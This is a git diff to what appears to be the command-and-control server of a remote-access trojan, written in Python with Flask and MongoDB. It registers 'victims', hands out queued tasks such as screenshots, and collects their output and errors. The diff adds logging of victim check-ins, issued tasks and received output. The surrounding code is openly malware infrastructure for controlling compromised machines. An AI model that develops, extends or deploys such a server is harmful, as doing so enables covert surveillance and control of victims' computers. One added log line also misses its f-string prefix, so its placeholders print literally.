@@ -8,12 +8,13 @@ import pymongo
 import logging
 import pdb
 import base64
-
+from lib.logger import Logger
+from termcolor import colored
 import pdb
 import time
 
 
-def main(db_object):
+def main(db_object,server_logger):
 	app = Flask('app')
 
 	## Get the cookie/victim ID from a request
@@ -54,7 +55,7 @@ def main(db_object):
 				if victim_id in Victim.victims.keys():
 					victim_obj = Victim.victims[victim_id]
 					victim_obj.update_last_seen_to_db()
-					print(f"Updates last seen of {victim_obj.victim_id}")
+					server_logger.info_log(f"Updated last seen of {victim_obj.victim_id}")
 
 			task = Task.find_unissued_task(victim_id)
 
@@ -62,7 +63,7 @@ def main(db_object):
 			if task:
 				task_obj = Task.load_task(task)
 				task_dict = task_obj.issue_dict()
-				
+				server_logger.info_log(f"Task issued - {task_dict}")
 				return task_dict
 
 			## Default reply of server incase no commands
@@ -90,6 +91,7 @@ def main(db_object):
 		if request.method == 'POST':
 			victim_id = get_cookie(request)
 
+			server_logger.info_log("Recieved task output for task ID - {task_id} , Victim ID - {victim_id} , Command - {cmd}",'green')
 			## Handling for various kind of tasks
 			if cmd == 'screenshot':
 
@@ -150,6 +152,7 @@ def main(db_object):
 
 
 				if victim_obj:
+					server_logger.info_log(f"New victim checked in - {victim_id} , {info['platform']}",'green')
 					return ('Victim registered', 200)
 				else:
 					return ('Victim already registered', 302)
@@ -162,7 +165,7 @@ def main(db_object):
 	@app.route('/clienterror',methods = ['POST'])
 	def clienterror():
 		if request.method == 'POST':
-			print(f"Recieved error from victim - {request.data.decode('utf-8')}")
+			server_logger.info_log(f"Recieved error from victim - {request.data.decode('utf-8')}",'yellow')
 
 			return ('Error Recieved, we will get back to you', 200)
 
@@ -171,7 +174,14 @@ def main(db_object):
 
 
 if __name__=="__main__":
-	db_object = Database(url="mongodb://localhost:27017/")
+	server_logger = Logger(logdir='logs',logfile='logs',verbose=False )
+	server_logger.setup()
+
+	db_url = "mongodb://localhost:27017/"
+
+	db_object = Database(url=db_url)
+
+	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
 	Victim.mongoclient = db_object.mongoclient
 	Task.mongoclient = db_object.mongoclient
-	main(db_object)
+	main(db_object,server_logger)
